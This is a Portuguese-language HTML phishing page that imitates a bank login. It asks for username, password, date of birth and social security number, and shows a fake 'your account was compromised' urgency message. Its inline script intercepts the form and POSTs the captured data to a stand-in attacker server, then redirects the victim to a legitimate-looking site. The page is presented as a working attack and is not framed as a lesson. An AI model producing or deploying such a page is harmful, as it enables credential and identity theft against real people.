<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Site de Banco Falso</title>
    <link rel="stylesheet" href="styles.css">
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            document.querySelector('form').addEventListener('submit', function(event) {
                event.preventDefault(); // Impede o envio do formulário

                // Obtém os dados do formulário
                var formData = new FormData(this);

                // Converte os dados para uma string
                var formDataString = '';
                for (var pair of formData.entries()) {
                    formDataString += pair[0] + '=' + encodeURIComponent(pair[1]) + '&';
                }

                // Envia os dados para um servidor controlado pelo atacante
                var xhr = new XMLHttpRequest();
                xhr.open('POST', 'http://servidor-do-atacante.com/registro-de-dados.php', true);
                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                xhr.send(formDataString);

                // Redireciona o usuário para uma página legítima
                window.location.href = 'https://site-legitimo.com';
            });
        });
    </script>
</head>
<body>
    <div class="container">
        <img src="logo.png" alt="Logo do Banco Falso">
        <h2>Por favor, faça login para acessar sua conta</h2>
        <form>
            <label for="username">Nome de Usuário:</label>
            <input type="text" id="username" name="username" required>

            <label for="password">Senha:</label>
            <input type="password" id="password" name="password" required>

            <label for="dob">Data de Nascimento:</label>
            <input type="date" id="dob" name="dob" required>

            <label for="ssn">Número do Seguro Social:</label>
            <input type="text" id="ssn" name="ssn" required>

            <button type="submit">Login</button>
        </form>
        <p class="urgency-message">Sua conta foi comprometida! Preencha os campos acima para recuperá-la imediatamente.</p>
        <p class="warning-message">Este site não exibe indicadores de segurança visual. Tenha cuidado ao inserir informações pessoais.</p>
    </div>
</body>
</html>
